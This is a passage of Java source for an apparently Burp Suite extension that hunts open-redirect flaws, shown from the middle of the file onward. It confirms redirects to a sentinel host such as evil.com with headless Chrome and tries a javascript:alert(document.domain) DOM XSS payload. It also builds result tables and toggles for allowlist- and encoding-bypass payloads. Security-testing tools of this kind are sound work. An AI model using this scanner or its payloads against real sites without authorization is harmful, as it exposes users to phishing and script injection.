                                    // avoids e.g. running full DOM headless fallback on 3 more params
                                    // after the 1st already confirmed something). Turn off for
                                    // thoroughness (find every vulnerable param on a page, not just
                                    // the first one hit).
        String sentinelHost = DEFAULT_SENTINEL;
        boolean genericPathRedirectEnabled = false; // tests each unique HOST's root path once with
                    // server/framework-level path-injection payloads (GENERIC_PATH_PAYLOADS) —
                    // independent of any query parameter. Off by default (adds ~90 requests per
                    // new host); runs on Live traffic too when enabled (per-host, deduped).

        // Payloads sub-tab state: every category defaults OFF — only CORE_ALWAYS_ON runs until
        // the user opts categories in. Populated at construction from PAYLOAD_CATEGORIES' keys.
        java.util.Map<String, Boolean> categoryEnabled = new java.util.LinkedHashMap<>();
        boolean smartAllowlistEnabled = false;
        boolean encodingBypassEnabled = false;

        Config()
        {
            for (String name : PAYLOAD_CATEGORIES.keySet()) categoryEnabled.put(name, false);
        }
    }

    // =======================================================================
    // Headless (Selenium) verifier — loaded via reflection so this extension
    // still compiles and loads cleanly even when selenium-java isn't present
    // on the classpath. See deepVerify() for how/why this is used.
    // =======================================================================
    static class HeadlessVerifier
    {
        static class Result
        {
            boolean seleniumAvailable;
            boolean matchedSentinel;
            String finalUrl;
            String error;
            String sinkInfo; // e.g. "script -> window.location.href (auth.js:142)" or "meta refresh" etc.
            String sinkDebug; // diagnostics: log-type availability + event counts, for troubleshooting "sink unknown"
        }

        private final boolean available;
        private Class<?> chromeDriverClass, chromeOptionsClass, webDriverClass;

        HeadlessVerifier()
        {
            boolean ok;
            try
            {
                chromeDriverClass = Class.forName("org.openqa.selenium.chrome.ChromeDriver");
                chromeOptionsClass = Class.forName("org.openqa.selenium.chrome.ChromeOptions");
                webDriverClass = Class.forName("org.openqa.selenium.WebDriver");
                ok = true;
            }
            catch (Throwable t) { ok = false; }
            available = ok;
        }

        static class DomXssResult
        {
            boolean seleniumAvailable;
            boolean alertFired;
            String alertText;
            String finalUrl;
            String error;
        }

        boolean available() { return available; }

        /**
         * Navigates a fresh headless Chrome directly to the given URL (expected to already contain
         * a javascript: payload swapped into the redirect parameter — e.g.
         * javascript:alert(document.domain) — in place of the sentinel host) and polls for a real
         * native JS alert() dialog using Selenium's Alert API. This only makes sense to call AFTER
         * a DOM-based (client-side) redirect sink has already been confirmed for this parameter —
         * see the "Try DOM XSS" wiring in the main class for why: a server-side 302 Location header
         * redirect never executes page JS at all, so javascript: URIs are meaningless there.
         */
        DomXssResult tryDomXss(String url, int timeoutSeconds)
        {
            DomXssResult r = new DomXssResult();
            r.seleniumAvailable = available;
            if (!available) return r;

            Object driver = null;
            try
            {
                Object options = chromeOptionsClass.getDeclaredConstructor().newInstance();
                java.lang.reflect.Method addArguments = chromeOptionsClass.getMethod("addArguments", String[].class);
                addArguments.invoke(options, (Object) new String[]{
                        "--headless=new", "--disable-gpu", "--no-sandbox", "--window-size=1280,800"
                });

                java.lang.reflect.Constructor<?> ctor = chromeDriverClass.getConstructor(chromeOptionsClass);
                driver = ctor.newInstance(options);

                Object manageObj = webDriverClass.getMethod("manage").invoke(driver);
                Class<?> optionsIface = Class.forName("org.openqa.selenium.WebDriver$Options");
                Object timeoutsObj = optionsIface.getMethod("timeouts").invoke(manageObj);
                Class<?> timeoutsIface = Class.forName("org.openqa.selenium.WebDriver$Timeouts");
                timeoutsIface.getMethod("pageLoadTimeout", java.time.Duration.class)
                        .invoke(timeoutsObj, java.time.Duration.ofSeconds(timeoutSeconds));

                webDriverClass.getMethod("get", String.class).invoke(driver, url);

                Class<?> targetLocatorIface = Class.forName("org.openqa.selenium.WebDriver$TargetLocator");
                Class<?> alertIface = Class.forName("org.openqa.selenium.Alert");
                java.lang.reflect.Method switchTo = webDriverClass.getMethod("switchTo");
                java.lang.reflect.Method alertMethod = targetLocatorIface.getMethod("alert");
                java.lang.reflect.Method getText = alertIface.getMethod("getText");
                java.lang.reflect.Method accept = alertIface.getMethod("accept");

                long deadline = System.currentTimeMillis() + Math.max(1, timeoutSeconds) * 1000L;
                while (System.currentTimeMillis() < deadline)
                {
                    try
                    {
                        Object targetLocator = switchTo.invoke(driver);
                        Object alert = alertMethod.invoke(targetLocator); // throws (wrapped) if no alert yet
                        String text = (String) getText.invoke(alert);
                        r.alertFired = true;
                        r.alertText = text;
                        accept.invoke(alert); // dismiss it so driver.quit() doesn't hang on an open dialog
                        break;
                    }
                    catch (Throwable notYet)
                    {
                        // Expected while no alert is present yet (NoAlertPresentException, wrapped by
                        // reflection as InvocationTargetException) — just keep polling.
                    }
                    try { Thread.sleep(200); } catch (InterruptedException ignored) {}
                }

                if (!r.alertFired)
                {
                    try { r.finalUrl = (String) webDriverClass.getMethod("getCurrentUrl").invoke(driver); }
                    catch (Throwable ignored) {}
                }
            }
            catch (Throwable t)
            {
                r.error = t.getClass().getSimpleName() + ": " + t.getMessage();
            }
            finally
            {
                if (driver != null)
                {
                    try
                    {
                        // In case an unhandled alert is still open, dismiss it before quit() to avoid hanging.
                        try
                        {
                            Object targetLocator = webDriverClass.getMethod("switchTo").invoke(driver);
                            Object alert = Class.forName("org.openqa.selenium.WebDriver$TargetLocator")
                                    .getMethod("alert").invoke(targetLocator);
                            Class.forName("org.openqa.selenium.Alert").getMethod("dismiss").invoke(alert);
                        }
                        catch (Throwable ignored) {}
                        webDriverClass.getMethod("quit").invoke(driver);
                    }
                    catch (Throwable ignored) {}
                }
            }
            return r;
        }

        Result verify(String url, String sentinelHost, int timeoutSeconds)
        {
            Result r = new Result();
            r.seleniumAvailable = available;
            if (!available) return r;

            Object driver = null;
            try
            {
                Object options = chromeOptionsClass.getDeclaredConstructor().newInstance();
                java.lang.reflect.Method addArguments = chromeOptionsClass.getMethod("addArguments", String[].class);
                addArguments.invoke(options, (Object) new String[]{
                        "--headless=new", "--disable-gpu", "--no-sandbox", "--window-size=1280,800"
                });

                // Enable Chrome's "performance" log (raw CDP events, incl. Network.requestWillBeSent
                // with an "initiator" field) so we can later identify WHICH script/sink actually
                // triggered the client-side navigation to the sentinel host — not just that it happened.
                // Both capabilities are set as plain Maps via setCapability/setExperimentalOption so no
                // extra Selenium logging classes are required at compile time here.
                try
                {
                    java.lang.reflect.Method setCapability = chromeOptionsClass.getMethod("setCapability", String.class, Object.class);
                    setCapability.invoke(options, "goog:loggingPrefs", java.util.Collections.singletonMap("performance", "ALL"));

                    java.lang.reflect.Method setExperimentalOption = chromeOptionsClass.getMethod("setExperimentalOption", String.class, Object.class);
                    java.util.Map<String, Object> perfPrefs = new java.util.HashMap<>();
                    perfPrefs.put("enableNetwork", true);
                    setExperimentalOption.invoke(options, "perfLoggingPrefs", perfPrefs);
                }
                catch (Throwable ignored) { /* older Selenium/Chrome combo — sink attribution just won't be available */ }

                java.lang.reflect.Constructor<?> ctor = chromeDriverClass.getConstructor(chromeOptionsClass);
                driver = ctor.newInstance(options);

                // driver.manage().timeouts().pageLoadTimeout(Duration.ofSeconds(timeoutSeconds))
                Object manageObj = webDriverClass.getMethod("manage").invoke(driver);
                Class<?> optionsIface = Class.forName("org.openqa.selenium.WebDriver$Options");
                Object timeoutsObj = optionsIface.getMethod("timeouts").invoke(manageObj);
                Class<?> timeoutsIface = Class.forName("org.openqa.selenium.WebDriver$Timeouts");
                timeoutsIface.getMethod("pageLoadTimeout", java.time.Duration.class)
                        .invoke(timeoutsObj, java.time.Duration.ofSeconds(timeoutSeconds));

                Class<?> logsIface = Class.forName("org.openqa.selenium.logging.Logs");
                Class<?> logEntriesClass = Class.forName("org.openqa.selenium.logging.LogEntries");
                Class<?> logEntryClass = Class.forName("org.openqa.selenium.logging.LogEntry");
                java.lang.reflect.Method getMessage = logEntryClass.getMethod("getMessage");
                java.util.List<String> collectedPerfMessages = new java.util.ArrayList<>();

                webDriverClass.getMethod("get", String.class).invoke(driver, url);

                // Poll (rather than sleep-then-check-once) so we drain the performance log
                // repeatedly DURING the settle window. This matters for two reasons:
                //  1. A cross-origin navigation (e.g. a JS redirect to evil.com) can tear down the
                //     old CDP target and its buffered log entries along with it — draining
                //     logs().get(...) empties the buffer each call, so if we only call it once at
                //     the very end, any events from just before the navigation may already be gone.
                //  2. Some apps delay the actual redirect behind a JS countdown timer ("redirecting
                //     in 5 seconds...") — waiting only ~1.8s regardless of the configured timeout
                //     would report "did not redirect" before the timer even fires. We now honor the
                //     user's Headless Deep-Verify Timeout setting for how long to actually wait.
                Object logsObj = optionsIface.getMethod("logs").invoke(manageObj);
                long deadline = System.currentTimeMillis() + Math.max(1, timeoutSeconds) * 1000L;
                while (System.currentTimeMillis() < deadline)
                {
                    try
                    {
                        Object perfEntries = logsIface.getMethod("get", String.class).invoke(logsObj, "performance");
                        java.util.List<?> batch = (java.util.List<?>) logEntriesClass.getMethod("getAll").invoke(perfEntries);
                        for (Object entry : batch)
                        {
                            String msg = (String) getMessage.invoke(entry);
                            if (msg != null) collectedPerfMessages.add(msg);
                        }
                    }
                    catch (Throwable ignored) { /* "performance" log type unsupported — handled below via diagnostics */ }

                    // Exit early the moment we've actually landed on the sentinel host — no need
                    // to keep polling for the full timeout once the redirect has already happened.
                    try
                    {
                        String currentUrl = (String) webDriverClass.getMethod("getCurrentUrl").invoke(driver);
                        if (currentUrl != null)
                        {
                            String h = hostOfQuiet(currentUrl);
                            if (h != null && h.toLowerCase(Locale.ROOT).endsWith(sentinelHost.toLowerCase(Locale.ROOT))) break;
                        }
                    }
                    catch (Throwable ignored) {}

                    try { Thread.sleep(250); } catch (InterruptedException ignored) {}
                }

                String finalUrl = (String) webDriverClass.getMethod("getCurrentUrl").invoke(driver);
                r.finalUrl = finalUrl;
                // IMPORTANT: check the actual HOST of the final URL, not a substring match on the
                // whole URL string — the attack URL's own query string already contains the sentinel
                // host as text (e.g. ?redirect_url_path=https://evil.com), so a plain .contains() check
                // trivially "matches" even when the browser never actually navigated anywhere (blocked
                // by a WAF, stayed on the same page, etc). Only a real host match counts.
                r.matchedSentinel = false;
                if (finalUrl != null)
                {
                    try
                    {
                        URI finalUri = URI.create(finalUrl);
                        String host = finalUri.getHost();
                        r.matchedSentinel = host != null &&
                                host.toLowerCase(Locale.ROOT).endsWith(sentinelHost.toLowerCase(Locale.ROOT));
                    }
                    catch (Exception ignored) {}
                }

                if (r.matchedSentinel)
                {
                    extractSinkInfo(r, collectedPerfMessages, logsIface, logsObj, sentinelHost);
                }
            }
            catch (Throwable t)
            {
                r.error = t.getClass().getSimpleName() + ": " + t.getMessage();
            }
            finally
            {
                if (driver != null)
                {
                    try { webDriverClass.getMethod("quit").invoke(driver); } catch (Throwable ignored) {}
                }
            }
            return r;
        }

        /**
         * Reads Chrome's raw "performance" log (CDP Network domain events) and finds the
         * Network.requestWillBeSent entry whose request URL points at the sentinel host, then
         * pulls the "initiator" block out of that same event to report WHICH script (and, where
         * Chrome provides one, which function/line) actually triggered the navigation — e.g.
         * a "script" initiator means JS code (window.location, location.href, etc.) caused it,
         * a "parser" initiator typically means a <meta http-equiv="refresh"> tag did.
         *
         * This is best-effort: it does lightweight regex extraction on the raw JSON log lines
         * rather than pulling in a full JSON parser dependency, so on Chrome/Selenium version
         * combinations with a differently-shaped log entry it may simply come back empty —
         * callers should treat a null/empty sinkInfo as "unknown", not as a failure.
         */
        private String extractSinkInfo(Result r, java.util.List<String> perfMessages, Class<?> logsIface, Object logsObj, String sentinelHost)
        {
            try
            {
                // Diagnostic: confirm the "performance" log type is actually available on this
                // driver at all — if the capability wiring silently failed, this tells us why.
                try
                {
                    java.util.Set<?> availableTypes = (java.util.Set<?>) logsIface.getMethod("getAvailableLogTypes").invoke(logsObj);
                    r.sinkDebug = "available log types: " + availableTypes;
                }
                catch (Throwable ignored) { /* older Selenium may not expose this — non-fatal */ }

                String sentinelLower = sentinelHost.toLowerCase(Locale.ROOT);
                String bestSink = null;
                int totalEntries = perfMessages.size();
                int networkEvents = 0;
                int matchingHostEvents = 0;
                int urlExtractFailures = 0;
                int escapedFormatDetected = 0;
                String rawSample = null;
                String normalizedSample = null;
                java.util.LinkedHashSet<String> sampledHosts = new java.util.LinkedHashSet<>();

                for (String rawMsg : perfMessages)
                {
                    if (rawMsg == null) continue;
                    if (!rawMsg.contains("Network.requestWillBeSent")) continue;
                    networkEvents++;

                    // Selenium's LogEntry.getMessage() for the "performance" log type often comes back
                    // as a JSON envelope where the actual CDP payload is itself a JSON-encoded STRING
                    // (escaped quotes \" and escaped slashes \/), not a nested JSON object. Our regexes
                    // are written for plain (unescaped) JSON, so normalize first — this is why every
                    // single event was failing extraction before this fix.
                    String msg = normalizeCdpMessage(rawMsg);
                    if (!msg.equals(rawMsg)) escapedFormatDetected++;

                    // Keep one raw/normalized sample (first event we see) purely for debugging —
                    // if extraction is still failing after normalization, this shows exactly what
                    // the text actually looks like instead of guessing blind again.
                    if (rawSample == null)
                    {
                        rawSample = rawMsg.length() > 300 ? rawMsg.substring(0, 300) : rawMsg;
                        normalizedSample = msg.length() > 300 ? msg.substring(0, 300) : msg;
                    }

                    // IMPORTANT: don't just check whether the sentinel string appears ANYWHERE in the
                    // raw JSON — the very first navigation event is the attack URL itself, whose own
                    // query string literally contains "evil.com" as text (e.g.
                    // ?redirect_url_path=https://evil.com), which would trivially "match" here even
                    // though that request's initiator is "other" (it's the driver.get() navigation,
                    // not a script). We only care about the event whose actual REQUEST URL's host is
                    // the sentinel — i.e. the request the browser made TO evil.com, not a request
                    // that merely mentions it in a parameter.
                    String requestUrl = extractRequestUrl(msg);
                    if (requestUrl == null) { urlExtractFailures++; continue; }
                    String requestHost = hostOfQuiet(requestUrl);
                    if (requestHost != null && sampledHosts.size() < 15) sampledHosts.add(requestHost);
                    if (requestHost == null || !requestHost.toLowerCase(Locale.ROOT).endsWith(sentinelLower)) continue;
                    matchingHostEvents++;

                    String sink = parseInitiator(msg);
                    if (sink != null)
                    {
                        bestSink = sink;
                        // Prefer a "script" initiator (has real call-frame detail) over others if we
                        // find more than one matching entry; otherwise keep the first found.
                        if (sink.startsWith("script")) break;
                    }
                }
                r.sinkDebug = (r.sinkDebug != null ? r.sinkDebug + " | " : "") +
                        "total perf-log entries (polled): " + totalEntries + ", Network.requestWillBeSent: " + networkEvents +
                        ", matching sentinel host: " + matchingHostEvents + ", url-extract failures: " + urlExtractFailures +
                        ", escaped-format msgs: " + escapedFormatDetected + ", sampled hosts seen: " + sampledHosts +
                        " || RAW SAMPLE: " + rawSample + " || NORMALIZED SAMPLE: " + normalizedSample;
                r.sinkInfo = bestSink;
                return bestSink;
            }
            catch (Throwable t)
            {
                r.sinkDebug = (r.sinkDebug != null ? r.sinkDebug + " | " : "") +
                        "extractSinkInfo failed: " + t.getClass().getSimpleName() + ": " + t.getMessage();
                return null; // performance log unavailable on this Chrome/Selenium combo — not fatal
            }
        }

        // NOTE: Chrome/ChromeDriver serializes these CDP messages with keys in ALPHABETICAL order,
        // not CDP-spec declaration order — so inside "request", "url" is NOT the first key (it comes
        // after "method", "mixedContentType", etc). This pattern therefore does NOT anchor "url" to
        // the opening brace; it lazily skips ahead (across any nested objects like "headers":{...})
        // until it finds the first "url" key within the request object.
        private static final Pattern REQUEST_URL = Pattern.compile(
                "\"request\"\\s*:\\s*\\{[\\s\\S]*?\"url\"\\s*:\\s*\"([^\"]+)\"");

        /**
         * Normalizes a raw CDP performance-log message so our plain-JSON regexes can match it
         * regardless of which shape ChromeDriver handed back. Two shapes are seen in practice:
         *   1. Plain nested JSON:   {"method":"Network.requestWillBeSent","params":{"request":{"url":"...
         *   2. Escaped-string JSON: {"message":"{\"method\":\"Network.requestWillBeSent\",...\"url\":\"https:\\/\\/evil.com\\/\"...}
         * Shape 2 is what real ChromeDriver performance logs actually use — the CDP payload is
         * itself a JSON-encoded STRING value, so \" and \/ show up literally in the text. Some
         * environments double-wrap this (a JSON string inside a JSON string), so we unescape
         * repeatedly until it stops changing (bounded to a handful of passes) rather than once.
         */
        private String normalizeCdpMessage(String raw)
        {
            String current = raw;
            for (int pass = 0; pass < 4; pass++)
            {
                if (!current.contains("\\\"")) break; // no more escaped quotes left to unwrap
                String next = current.replace("\\\"", "\"").replace("\\/", "/").replace("\\\\", "\\");
                if (next.equals(current)) break;
                current = next;
            }
            return current;
        }

        private String extractRequestUrl(String cdpMessageJson)
        {
            java.util.regex.Matcher m = REQUEST_URL.matcher(cdpMessageJson);
            return m.find() ? m.group(1) : null;
        }

        private String hostOfQuiet(String urlString)
        {
            try { return URI.create(urlString).getHost(); }
            catch (Exception e) { return null; }
        }

        // Very small hand-rolled extraction (no JSON dependency) over a single CDP log line.
        // Same alphabetical-key-ordering caveat as REQUEST_URL applies here too — "type" is NOT
        // guaranteed to be the first key inside "initiator" (real order: columnNumber, lineNumber,
        // requestId, stack, type, url — alphabetical), so this also scans ahead rather than
        // anchoring to the opening brace.
        private static final Pattern INITIATOR_TYPE = Pattern.compile(
                "\"initiator\"\\s*:\\s*\\{[\\s\\S]*?\"type\"\\s*:\\s*\"([a-zA-Z]+)\"");
        // Grabs the raw contents of the FIRST call-frame object in the stack (CDP call frames have
        // only primitive fields — no nested objects — so a plain "up to the next }" cut is safe here).
        private static final Pattern FIRST_CALL_FRAME = Pattern.compile("\"callFrames\"\\s*:\\s*\\[\\s*\\{([^}]*)\\}");
        private static final Pattern FIELD_FUNCTION_NAME = Pattern.compile("\"functionName\"\\s*:\\s*\"([^\"]*)\"");
        private static final Pattern FIELD_URL = Pattern.compile("\"url\"\\s*:\\s*\"([^\"]*)\"");
        private static final Pattern FIELD_LINE_NUMBER = Pattern.compile("\"lineNumber\"\\s*:\\s*(\\d+)");

        private String parseInitiator(String cdpMessageJson)
        {
            java.util.regex.Matcher typeMatcher = INITIATOR_TYPE.matcher(cdpMessageJson);
            if (!typeMatcher.find()) return null;
            String type = typeMatcher.group(1); // "script", "parser", "other", "preload", etc.

            if ("script".equalsIgnoreCase(type))
            {
                java.util.regex.Matcher frameBlock = FIRST_CALL_FRAME.matcher(cdpMessageJson);
                if (frameBlock.find())
                {
                    String frameText = frameBlock.group(1); // contents of one call-frame object, order-independent from here
                    java.util.regex.Matcher fnM = FIELD_FUNCTION_NAME.matcher(frameText);
                    java.util.regex.Matcher urlM = FIELD_URL.matcher(frameText);
                    java.util.regex.Matcher lineM = FIELD_LINE_NUMBER.matcher(frameText);

                    if (urlM.find() && lineM.find())
                    {
                        String functionName = (fnM.find() && !fnM.group(1).isEmpty()) ? fnM.group(1) : "(anonymous)";
                        String scriptUrl = urlM.group(1);
                        String line = lineM.group(1);
                        String shortScript = scriptUrl.length() > 60
                                ? "..." + scriptUrl.substring(scriptUrl.length() - 60) : scriptUrl;
                        return "script -> " + functionName + "() at " + shortScript + ":" + line;
                    }
                }
                return "script (JS-triggered navigation — window.location/location.href/history API — exact call frame unavailable)";
            }
            else if ("parser".equalsIgnoreCase(type))
            {
                return "parser (HTML-triggered — likely a <meta http-equiv=\"refresh\"> tag, not JS)";
            }
            else
            {
                return type + " (non-script initiator)";
            }
        }
    }

    // =======================================================================
    // Result row + table model
    // =======================================================================
    static class ResultRow
    {
        final Date time; final String method; final String url; final String param;
        final String type; final String payload; final String evidenceDetail; final String confidence;
        final HttpRequestResponse original; final HttpRequestResponse evidence; final ScanSource source;
        volatile String headlessStatus = "Not run";
        volatile boolean highImpact = false;

        ResultRow(Date time, String method, String url, String param, String type, String payload,
                  String evidenceDetail, String confidence, HttpRequestResponse original, HttpRequestResponse evidence,
                  ScanSource source)
        {
            this.time = time; this.method = method; this.url = url; this.param = param;
            this.type = type; this.payload = payload; this.evidenceDetail = evidenceDetail;
            this.confidence = confidence; this.original = original; this.evidence = evidence;
            this.source = source;
        }
    }

    static class ResultsTableModel extends AbstractTableModel
    {
        private static final long serialVersionUID = 1L;
        static final String[] COLUMNS = {"Time", "Method", "URL", "Param", "Type", "Payload", "Evidence", "Confidence", "Headless", "Source"};
        private final transient List<ResultRow> rows = new ArrayList<>();
        private final SimpleDateFormat fmt = new SimpleDateFormat("HH:mm:ss");

        synchronized void addRow(ResultRow r)
        {
            rows.add(r);
            int idx = rows.size() - 1;
            SwingUtilities.invokeLater(() -> fireTableRowsInserted(idx, idx));
        }

        synchronized void clear()
        {
            rows.clear();
            SwingUtilities.invokeLater(this::fireTableDataChanged);
        }

        synchronized ResultRow get(int i) { return rows.get(i); }
        synchronized List<ResultRow> all() { return new ArrayList<>(rows); }

        void notifyRowChanged(ResultRow row)
        {
            int idx;
            synchronized (this) { idx = rows.indexOf(row); }
            if (idx >= 0) SwingUtilities.invokeLater(() -> fireTableRowsUpdated(idx, idx));
        }

        @Override public int getRowCount() { return rows.size(); }
        @Override public int getColumnCount() { return COLUMNS.length; }
        @Override public String getColumnName(int c) { return COLUMNS[c]; }

        @Override
        public Object getValueAt(int r, int c)
        {
            ResultRow row;
            synchronized (this) { if (r >= rows.size()) return ""; row = rows.get(r); }
            switch (c)
            {
                case 0: return fmt.format(row.time);
                case 1: return row.method;
                case 2: return row.url;
                case 3: return row.param;
                case 4: return row.type;
                case 5: return row.payload;
                case 6: return row.evidenceDetail;
                case 7: return row.confidence;
                case 8: return row.headlessStatus;
                case 9: return row.source != null ? row.source.label : "";
                default: return "";
            }
        }
    }

    // =======================================================================
    // UI
    // =======================================================================
    static class ExtensionUI
    {
        private final MontoyaApi api;
        private final Config cfg;
        private final ResultsTableModel model;
        private final OpenRedirectHunterTab owner;

        private JTabbedPane root;
        private JPanel scannerPanel;
        private JTable table;
        private TableRowSorter<ResultsTableModel> sorter;
        private JTextArea logArea;
        private JLabel statsLabel;
        private JTextField tfFilter;
        private JCheckBox cbConfirmedOnly, cbHighImpactOnly;
        private HttpRequestEditor reqViewer;
        private HttpResponseEditor respViewer;

        private JCheckBox cbEnabled, cbGet, cbPostBody, cbHighlight, cbScopeOnly, cbDedup, cbHeadlessFallback, cbDomFallbackOnLive, cbTryDomXss, cbStopAfterFirstFinding;
        private JTextField tfSentinel, tfThreads, tfRateLimit, tfHeadlessTimeout;

        ExtensionUI(MontoyaApi api, Config cfg, ResultsTableModel model, OpenRedirectHunterTab owner)
        {
            this.api = api; this.cfg = cfg; this.model = model; this.owner = owner;
            build();
        }

        Component root() { return root; }

        private void build()
        {
            scannerPanel = new JPanel(new BorderLayout());
            scannerPanel.add(buildSettings(), BorderLayout.NORTH);

            table = new JTable(model);
            table.setAutoResizeMode(JTable.AUTO_RESIZE_OFF);
            table.setSelectionMode(ListSelectionModel.SINGLE_SELECTION);
            table.getColumnModel().getColumn(2).setPreferredWidth(320); // URL
            table.getColumnModel().getColumn(5).setPreferredWidth(220); // Payload
            table.getColumnModel().getColumn(6).setPreferredWidth(260); // Evidence

            // Severity-tiered row coloring: DOM XSS (critical) darkest, HIGH-IMPACT redirects red,
            // other CONFIRMED a lighter red, LIKELY orange, LOW/other yellow.
            DefaultTableCellRenderer confRenderer = new DefaultTableCellRenderer()
            {
                @Override
                public Component getTableCellRendererComponent(JTable t, Object v, boolean sel, boolean foc, int r, int c)
                {
                    Component comp = super.getTableCellRendererComponent(t, v, sel, foc, r, c);
                    if (!sel)
                    {
                        ResultRow row = model.get(t.convertRowIndexToModel(r));
                        comp.setBackground(rowColor(row));
                    }
                    return comp;
                }
            };
            for (int i = 0; i < model.getColumnCount(); i++) table.getColumnModel().getColumn(i).setCellRenderer(confRenderer);
            table.addMouseListener(new TableMouse());

            // Column sorting + filtering
            sorter = new TableRowSorter<>(model);
            table.setRowSorter(sorter);

            // Clicking a finding loads its actual attack request + response into Burp's native
            // editors below — previously there was no way to inspect the evidence inside the tab.
            table.getSelectionModel().addListSelectionListener(e -> {
                if (e.getValueIsAdjusting()) return;
                int vr = table.getSelectedRow();
                if (vr < 0) return;
                try
                {
                    ResultRow row = model.get(table.convertRowIndexToModel(vr));
                    HttpRequestResponse ev = row.evidence != null ? row.evidence : row.original;
                    if (ev != null && ev.request() != null) reqViewer.setRequest(ev.request());
                    if (ev != null && ev.response() != null) respViewer.setResponse(ev.response());
                }
                catch (Exception ignored) {}
            });

            JScrollPane tableScroll = new JScrollPane(table);
            JPanel tableArea = new JPanel(new BorderLayout());
            tableArea.add(buildFilterBar(), BorderLayout.NORTH);
            tableArea.add(tableScroll, BorderLayout.CENTER);

            // Native Burp request/response viewers (read-only).
            reqViewer = api.userInterface().createHttpRequestEditor(EditorOptions.READ_ONLY);
            respViewer = api.userInterface().createHttpResponseEditor(EditorOptions.READ_ONLY);
            JSplitPane viewerSplit = new JSplitPane(JSplitPane.HORIZONTAL_SPLIT,
                    wrapTitled(reqViewer.uiComponent(), "Request"),
                    wrapTitled(respViewer.uiComponent(), "Response"));
            viewerSplit.setResizeWeight(0.5);

            logArea = new JTextArea();
            logArea.setEditable(false);
            logArea.setFont(new Font("Monospaced", Font.PLAIN, 12));
            JScrollPane logScroll = new JScrollPane(logArea);

            // Bottom stack: request/response viewer over the log.
            JSplitPane bottomSplit = new JSplitPane(JSplitPane.VERTICAL_SPLIT, viewerSplit, logScroll);
            bottomSplit.setResizeWeight(0.65);

            JSplitPane split = new JSplitPane(JSplitPane.VERTICAL_SPLIT, tableArea, bottomSplit);
            split.setResizeWeight(0.45);
            scannerPanel.add(split, BorderLayout.CENTER);

            scannerPanel.add(buildStatusBar(), BorderLayout.SOUTH);

            root = new JTabbedPane();
            root.addTab("Scanner", scannerPanel);
            root.addTab("Payloads", buildPayloadsTab());
        }

        private Component wrapTitled(Component c, String title)
        {
            JPanel p = new JPanel(new BorderLayout());
            p.setBorder(BorderFactory.createTitledBorder(title));
            p.add(c, BorderLayout.CENTER);
            return p;
        }

        private Color rowColor(ResultRow row)
        {
            String conf = row.confidence == null ? "" : row.confidence;
            if (conf.contains("DOM XSS")) return new Color(255, 170, 170);        // critical — darkest
            if (row.highImpact) return new Color(255, 190, 190);                   // high-impact redirect
            if (conf.startsWith("CONFIRMED")) return new Color(255, 214, 214);     // confirmed
            if (conf.startsWith("LIKELY")) return new Color(255, 231, 186);        // likely — orange
            return new Color(255, 250, 205);                                        // low / other — yellow
        }

        // Filter bar: free-text filter across all columns + quick toggles.
        private JPanel buildFilterBar()
        {
            JPanel bar = new JPanel(new FlowLayout(FlowLayout.LEFT, 6, 2));
            bar.add(new JLabel("Filter:"));
            tfFilter = new JTextField(28);
            tfFilter.getDocument().addDocumentListener(new javax.swing.event.DocumentListener()
            {
                public void insertUpdate(javax.swing.event.DocumentEvent e) { applyRowFilter(); }
                public void removeUpdate(javax.swing.event.DocumentEvent e) { applyRowFilter(); }
                public void changedUpdate(javax.swing.event.DocumentEvent e) { applyRowFilter(); }
            });
            bar.add(tfFilter);
            cbConfirmedOnly = new JCheckBox("Confirmed only");
            cbConfirmedOnly.addActionListener(e -> applyRowFilter());
            cbHighImpactOnly = new JCheckBox("High-impact only");
            cbHighImpactOnly.addActionListener(e -> applyRowFilter());
            bar.add(cbConfirmedOnly);
            bar.add(cbHighImpactOnly);
            return bar;
        }

        private void applyRowFilter()
        {
            final String text = tfFilter.getText().trim().toLowerCase(Locale.ROOT);
            final boolean confOnly = cbConfirmedOnly.isSelected();
            final boolean impactOnly = cbHighImpactOnly.isSelected();
            sorter.setRowFilter(new RowFilter<ResultsTableModel, Integer>()
            {
                @Override
                public boolean include(Entry<? extends ResultsTableModel, ? extends Integer> entry)
                {
                    ResultRow row = model.get(entry.getIdentifier());
                    if (confOnly && (row.confidence == null || !row.confidence.startsWith("CONFIRMED"))) return false;
                    if (impactOnly && !row.highImpact) return false;
                    if (text.isEmpty()) return true;
                    String hay = (row.url + " " + row.param + " " + row.payload + " " +
                            row.evidenceDetail + " " + row.confidence + " " +
                            (row.source != null ? row.source.label : "")).toLowerCase(Locale.ROOT);
                    return hay.contains(text);
                }
            });
        }

        /**
         * "Payloads" sub-tab — every optional bypass category as an independent checkbox, defaulting
         * OFF. Only CORE_ALWAYS_ON (https://{HOST}/, //{HOST}/, ///{HOST}/) runs regardless of these.
         */
        private JScrollPane buildPayloadsTab()
        {
            JPanel panel = new JPanel();
            panel.setLayout(new BoxLayout(panel, BoxLayout.Y_AXIS));
            panel.setBorder(BorderFactory.createEmptyBorder(10, 10, 10, 10));

            JPanel coreInfo = new JPanel(new BorderLayout());
            coreInfo.setBorder(BorderFactory.createTitledBorder("Always run (core baseline — not togglable)"));
            JTextArea coreList = new JTextArea(String.join("\n", CORE_ALWAYS_ON));
            coreList.setEditable(false);
            coreList.setBackground(panel.getBackground());
            coreList.setFont(new Font("Monospaced", Font.PLAIN, 12));
            coreInfo.add(coreList, BorderLayout.CENTER);
            coreInfo.setMaximumSize(new Dimension(Integer.MAX_VALUE, 90));
            panel.add(coreInfo);
            panel.add(Box.createVerticalStrut(8));

            JPanel specialToggles = new JPanel(new GridLayout(0, 1, 4, 4));
            specialToggles.setBorder(BorderFactory.createTitledBorder("Dynamic (target-aware) categories"));
            JCheckBox cbSmart = new JCheckBox("Smart Allowlist Bypass (anchored on this target's own host + baseline param value)", cfg.smartAllowlistEnabled);
            cbSmart.addActionListener(e -> cfg.smartAllowlistEnabled = cbSmart.isSelected());
            JCheckBox cbEnc = new JCheckBox("Dynamic Host-Encoding Bypass (fully percent-encoded host, dot-to-%2E, double-encoded dot)", cfg.encodingBypassEnabled);
            cbEnc.addActionListener(e -> cfg.encodingBypassEnabled = cbEnc.isSelected());
            JCheckBox cbGenericPath = new JCheckBox("Generic Path-Based Redirect (host-root, " + GENERIC_PATH_PAYLOADS.length +
                    " payloads, server/framework-level — no query param needed; runs once per unique host, incl. Live traffic)",
                    cfg.genericPathRedirectEnabled);
            cbGenericPath.addActionListener(e -> cfg.genericPathRedirectEnabled = cbGenericPath.isSelected());
            specialToggles.add(cbSmart);
            specialToggles.add(cbEnc);
            specialToggles.add(cbGenericPath);
            panel.add(specialToggles);
            panel.add(Box.createVerticalStrut(8));

